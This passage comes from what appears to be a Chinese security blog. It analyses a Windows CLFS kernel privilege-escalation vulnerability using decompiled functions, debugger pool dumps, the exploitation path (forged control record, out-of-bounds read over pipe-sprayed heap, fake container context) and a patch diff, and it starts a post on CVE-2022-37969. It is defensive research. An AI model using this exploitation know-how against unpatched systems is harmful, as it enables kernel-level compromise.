style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">ExtendMetadataBlock</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">int</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v36<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v42<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v34<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> EventObject<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlRecord</span>((CClfsBaseFile<span style="color:#f92672">*</span>)a1,<span style="color:#f92672">&amp;</span>v34);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> EventObject<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">FlushControlRecord</span>((CClfsBaseFilePersisted<span style="color:#f92672">*</span>)a1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( k<span style="color:#f92672">=</span> EventObject; EventObject<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span>; k<span style="color:#f92672">=</span> EventObject )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_41:</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>v12<span style="color:#f92672">!=</span><span style="color:#ae81ff">2</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> v27<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">0xD</span>);</span></span><span style="display:flex;"><span> v28<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">0xD</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ((_WORD)v27<span style="color:#f92672">==</span><span style="color:#f92672">*</span>((_WORD<span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">IsShadowBlock</span>(v14, v27,<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">12</span>)))</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">*</span> v27<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">>></span><span style="color:#ae81ff">9</span><span style="color:#f92672">&lt;</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">ExtendMetadataBlockDescriptor</span>(</span></span><span style="display:flex;"><span> (CClfsBaseFilePersisted<span style="color:#f92672">*</span>)a1,</span></span><span style="display:flex;"><span> v28,</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)v34<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>)<span style="color:#f92672">>></span><span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOWORD</span>(v27)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>v25;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">WriteMetadataBlock</span>((CClfsBaseFilePersisted<span style="color:#f92672">*</span>)a1, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)v27,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)EventObject;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>WriteMetadataBlock的第二个参数来源于CClfsBaseFile::GetControlRecord的第二个参数，跟进CClfsBaseFile::GetControlRecord逻辑</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetControlRecord</span>(CClfsBaseFile<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">struct</span> _CLFS_CONTROL_RECORD<span style="color:#f92672">**</span>a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a2<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AcquireMetadataBlock</span>(this);</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> result;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)result<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> (_DWORD<span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>);<span style="color:#75715e">// 访问this+0x30处的指针，这个指针指向了0x90大小的heap</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v7<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v6;<span style="color:#75715e">// 该段内存存储了一些内存指针，获取偏移0x0处的指针，这个指针指向了control block</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v8<span style="color:#f92672">=</span> v6[<span style="color:#ae81ff">2</span>];</span></span><span style="display:flex;"><span> v9<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>i64);<span style="color:#75715e">// 获取control block 0x28的数值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)v6<span style="color:#f92672">+</span> v9;<span style="color:#75715e">// 将control block 0x28处数值和control block相加，计算control record</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">&lt;</span> v8<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x70</span><span style="color:#f92672">&amp;&amp;</span> v8<span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x68</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>i64<span style="color:#f92672">*</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">72</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8<span style="color:#f92672">-</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v9<span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#f92672">>=</span> v11 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (g_signatureOffsetsValidation<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span>), v11<span style="color:#f92672">+</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(v9<span style="color:#f92672">+</span><span style="color:#ae81ff">80</span>)<span style="color:#f92672">&lt;=</span> v12)</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v12<span style="color:#f92672">&lt;=</span> v8</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">RtlULongMult</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v7<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">2u</span>,<span style="color:#f92672">&amp;</span>v13)<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">RtlULongAdd</span>(v12, v13,<span style="color:#f92672">&amp;</span>v14)<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> v14<span style="color:#f92672">&lt;=</span> v8 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a2<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_CONTROL_RECORD<span style="color:#f92672">*</span>)v10;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( WPP_GLOBAL_Control<span style="color:#f92672">!=</span><span style="color:#f92672">&amp;</span>WPP_GLOBAL_Control<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x8000000</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">WPP_SF_sdLLH</span>(<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)WPP_GLOBAL_Control<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0xC01A000D</span>i64;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>分析该代码，虽然this参数为CClfsBaseFile *类型，但在调用CClfsBaseFile::GetControlRecord的CClfsBaseFilePersisted::ExtendMetadataBlock函数中传入的该参数原类型为CClfsBaseFilePersisted。</p><p>该代码最终计算a2的逻辑为从this+30处取得指针并解引用，获得control block地址，而后解引用该地址并在偏移0x28处取得一个偏移，将这个偏移和control block相加获得control record地址并赋给a2.</p><p>在调试器中可以看到该偏移为0x70，即从control block +0x70位置定位到了control record</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> db ffffe381`a5c7f680 + 0x28</span></span><span style="display:flex;"><span>ffffe381`a5c7f6a8 70 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 p...............</span></span></code></pre></div><p>回到CClfsBaseFilePersisted::ExtendMetadataBlock函数中，在取得control record之后，在control record+0x1a处取得值并作为第二个参数传入CClfsBaseFilePersisted::WriteMetadataBlock中，该处取得值为0x13</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> db ffffe381`a5c7f680 + 0x70 + 0x1a</span></span><span style="display:flex;"><span>ffffe381`a5c7f70a 13 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span></code></pre></div><p>根据前面CClfsBaseFilePersisted::WriteMetadataBlock的逻辑可知，在第二个参数传入0x13之后计算的偏移为0x18*0x13=0x1c8，即从poi(CClfsBaseFilePersisted+0x30)+0x1c8取得值并获取poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28处的偏移。</p><p>在前面分析CClfsBaseFilePersisted结构知道，0x30偏移处指向的堆内存大小只有0xa0</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> !pool ffffa289`19254810</span></span><span style="display:flex;"><span>Pool page ffffa28919254810 region is Nonpaged pool</span></span><span style="display:flex;"><span> ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa28919254760 size: a0 previous size: 0 (Free) Vad</span></span><span style="display:flex;"><span>*ffffa28919254800 size: a0 previous size: 0 (Allocated) *Clfs</span></span><span style="display:flex;"><span> Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys</span></span><span style="display:flex;"><span> ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa28919254940 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span></code></pre></div><p>当使用0x1c8访问时会产生越界，此时读取到的实际是使用pipe WriteFile时申请的堆，此前通过pipe写入了主blf文件的base block+0x30，所以该处读取到的地址实际上是主blf文件的base block + 0x30。</p><p>经过poi(poi(CClfsBaseFilePersisted+0x30)+0x1c8)+0x28运算会取到主blf文件的base block + 0x58的位置，而该位置值已经被修改为了0x369.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> dq ffffa289`19254810 + 0x1c8</span></span><span style="display:flex;"><span>ffffa289`192549d8 ffffe381`a2303030 7246704e`0a0a0000</span></span><span style="display:flex;"><span>ffffa289`192549e8 5e85fe62`4567d0ee ffffe381`a9cb4258</span></span><span style="display:flex;"><span>ffffa289`192549f8 ffffe381`a9cb4258 00000000`00000000</span></span><span style="display:flex;"><span>ffffa289`19254a08 ffffe381`a90c79c0 00000060`00000000</span></span><span style="display:flex;"><span>ffffa289`19254a18 00000000`00000060 ffffe381`a2303030</span></span><span style="display:flex;"><span>ffffa289`19254a28 ffffe381`a2303030 ffffe381`a2303030</span></span><span style="display:flex;"><span>ffffa289`19254a38 ffffe381`a2303030 ffffe381`a2303030</span></span><span style="display:flex;"><span>ffffa289`19254a48 ffffe381`a2303030 ffffe381`a2303030</span></span><span style="display:flex;"><span>0: kd> !pool ffffa289`19254810+0x1c8</span></span><span style="display:flex;"><span>Pool page ffffa289192549d8 region is Nonpaged pool</span></span><span style="display:flex;"><span> ffffa28919254080 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254120 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192541c0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254260 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254300 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192543a0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254440 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192544e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254580 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254620 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa289192546c0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa28919254760 size: a0 previous size: 0 (Free) Vad</span></span><span style="display:flex;"><span> ffffa28919254800 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span> ffffa289192548a0 size: a0 previous size: 0 (Allocated) Clfs</span></span><span style="display:flex;"><span>*ffffa28919254940 size: a0 previous size: 0 (Allocated) *NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> Pooltag NpFr : DATA_ENTRY records (read/write buffers), Binary : npfs.sys</span></span><span style="display:flex;"><span> ffffa289192549e0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254a80 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254b20 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254bc0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254c60 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254d00 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254da0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254e40 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span><span style="display:flex;"><span> ffffa28919254ee0 size: a0 previous size: 0 (Allocated) NpFr Process: ffffa28915324300</span></span></code></pre></div><p>之后通过运算poi(0x369+ base block + 0x30)++实际上让主blf文件的base block+0x399自增1。最终在对主blf文件调用CreateLogFile是定位到的container context偏移为0x1570，找到了攻击者伪造的恶意contener context，在通过pContainer对象执行到了用户层内存0x5000000之中。</p><p><strong>补丁分析</strong></p><p><strong>Win10 21H2</strong></p><p>diff补丁，可发现补丁主要修改了CClfsBaseFile::GetControlRecord、CClfsBaseFile::AcquireMetadataBlock，同时新增了一个函数CClfsLogFcbPhysical::ValidateScratchBlockOffsets，在CClfsLogFcbPhysical::SetEndOfLog和CClfsLogFcbPhysical::RecoverTruncateLog中引用。</p><p><strong>Win11 21H2</strong></p><p><strong>小结</strong></p><p>在CVE-2022-37969中是通过前一个blf文件的错误的cbSymbolZone修改了下一个blf文件的conteiner context的pContaienr对象指针，从而在后续定位CClfsContainer对象时访问到了用户层内存，达成攻击流程，该漏洞利用需要通过循环创建blf文件来达到稳定的堆内存结构，从而使得后续可以成功修改后面的blf文件的conteiner context。</p><p>在CVE-2022-37969补丁中增加了对client context、cbSymbolZone越界检测，从而不能直接通过这种方法损坏conteiner context对象指针。</p><p>在本次漏洞利用中，巧妙地通过伪造control record的数据来造成越界读取，从而修改另外的base block数据，该处修改是通过指针定位到指定的内存，所以不用像CVE-2022-37969中通过反复创建blf文件来达成一种稳定的内存间隙状态，但利用过程中仍然需要通过布局内存使得在越界读取时读取到的是指定的内存地址。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.secrss.com/articles/54881" target="_blank">https://www.secrss.com/articles/54881</a></p><p><a href="https://www.anquanke.com/post/id/288808" target="_blank">https://www.anquanke.com/post/id/288808</a></p></blockquote><p><a href="https://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/" target="_blank">https://securelist.com/nokoyawa-ransomware-attacks-with-windows-zero-day/109483/</a></p><p><strong>Created at 2023-05-31T19:44:15+08:00</strong></p></description></item><item><title>CVE-2022-37969</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/</link><pubDate>Fri, 26 May 2023 10:56:00 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/</guid><description><h3 id="基本信息">基本信息</h3><p>blf日志文件结构</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/1.png"/></p><p>基本日志块存储了基本日志文件关联的客户端和容器上下文信息</p><p>基本日志块由6个meta数据块组成，分别是控制块、基本块、截断块以及对应的shadow块，每个块由日志块头开始，大小为0x70 bytes</p><p>日志块头定义：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_LOG_BLOCK_HEADER</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> UCHAR MajorVersion;</span></span><span style="display:flex;"><span> UCHAR MinorVersion;</span></span><span style="display:flex;"><span> UCHAR Usn;</span></span><span style="display:flex;"><span> CLFS_CLIENT_ID ClientId;</span></span><span style="display:flex;"><span> USHORT TotalSectorCount;</span></span><span style="display:flex;"><span> USHORT ValidSectorCount;</span></span><span style="display:flex;"><span> ULONG Padding;</span></span><span style="display:flex;"><span> ULONG Checksum;</span></span><span style="display:flex;"><span> ULONG Flags;</span></span><span style="display:flex;"><span> CLFS_LSN CurrentLsn;</span></span><span style="display:flex;"><span> CLFS_LSN NextLsn;</span></span><span style="display:flex;"><span> ULONG RecordOffsets[<span style="color:#ae81ff">16</span>];</span></span><span style="display:flex;"><span> ULONG SignaturesOffset;</span></span><span style="display:flex;"><span>} CLFS_LOG_BLOCK_HEADER,<span style="color:#f92672">*</span>PCLFS_LOG_BLOCK_HEADER;</span></span></code></pre></div><p>内存布局</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/1.png"/></p><p>SignatureOffset是了在内存中存储每个扇区签名的数组的偏移。扇区签名位于每个扇区的末尾，大小两个字节，由扇区块类型（1 字节）和 USN（1 字节）组成。<strong>每个扇区大小为0x200。</strong></p><p>在BLF文件中，基本块从偏移0x800开始，到0x81FF，以日志块头开始，然后是基本记录头</p><p>基本记录头定义如下,大小为1338，到偏移1BA8处</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_METADATA_RECORD_HEADER</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ULONGLONG ullDumpCount;</span></span><span style="display:flex;"><span>} CLFS_METADATA_RECORD_HEADER,<span style="color:#f92672">*</span> PCLFS_METADATA_RECORD_HEADER;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _CLFS_BASE_RECORD_HEADER</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> CLFS_METADATA_RECORD_HEADER hdrBaseRecord;</span></span><span style="display:flex;"><span> CLFS_LOG_ID cidLog;</span></span><span style="display:flex;"><span> ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE];</span></span><span style="display:flex;"><span> ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE];</span></span><span style="display:flex;"><span> ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE];</span></span><span style="display:flex;"><span> ULONG cNextContainer;</span></span><span style="display:flex;"><span> CLFS_CLIENT_ID cNextClient;</span></span><span style="display:flex;"><span> ULONG cFreeContainers;</span></span><span style="display:flex;"><span> ULONG cActiveContainers;</span></span><span style="display:flex;"><span> ULONG cbFreeContainers;</span></span><span style="display:flex;"><span> ULONG cbBusyContainers;</span></span><span style="display:flex;"><span> ULONG rgClients[MAX_CLIENTS_DEFAULT];</span></span><span style="display:flex;"><span> ULONG rgContainers[MAX_CONTAINERS_DEFAULT];</span></span><span style="display:flex;"><span> ULONG cbSymbolZone;</span></span><span style="display:flex;"><span> ULONG cbSector;</span></span><span style="display:flex;"><span> USHORT bUnused;</span></span><span style="display:flex;"><span> CLFS_LOG_STATE eLogState;</span></span><span style="display:flex;"><span> UCHAR cUsn;</span></span><span style="display:flex;"><span> UCHAR cClients;</span></span><span style="display:flex;"><span>} CLFS_BASE_RECORD_HEADER,<span style="color:#f92672">*</span> PCLFS_BASE_RECORD_HEADER;</span></span></code></pre></div><p>内存布局：</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/2.png"/></p><p>此次漏洞重点字段：</p><ul><li><p>rgContainers</p><p>存储了<code>CLFS_CONTAINER_CONTEXT</code>数组相对于基本块的偏移</p></li><li><p>rgClients</p><p>存储了<code>_CLFS_CLIENT_CONTEXT</code> 